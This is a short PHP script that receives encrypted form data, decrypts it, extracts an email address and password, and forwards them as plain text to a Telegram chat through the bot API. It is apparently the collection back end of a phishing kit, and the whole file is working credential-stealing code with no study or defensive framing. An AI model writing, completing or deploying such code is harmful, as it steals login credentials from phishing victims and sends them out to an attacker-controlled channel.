<?php
require 'vendor/autoload.php'; // Make sure to include the Composer autoloader
use Defuse\Crypto\Crypto;
use Defuse\Crypto\Key;

$config = parse_ini_file('config.ini', true);
$chat_id = $config['Telegram']['chat_id'];
$token = $config['Telegram']['token'];

$input = json_decode(file_get_contents('php://input'), true);
$encrypted_data = $input['data'];

// Decrypt the data
$key = 'encryption_key'; // Use the same key as in the JavaScript
$decrypted_data = Crypto::decrypt($encrypted_data, Key::loadFromAsciiSafeString($key));
$data = json_decode($decrypted_data, true);

$email = $data['email'];
$password = $data['password'];

// Send the data to Telegram
$message = "Email: $email\nPassword: $password";
$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);

$response = file_get_contents($url);
if ($response === false) {
    echo json_encode(['success' => false, 'message' => 'Failed to send message to Telegram']);
} else {
    echo json_encode(['success' => true]);
}
?>
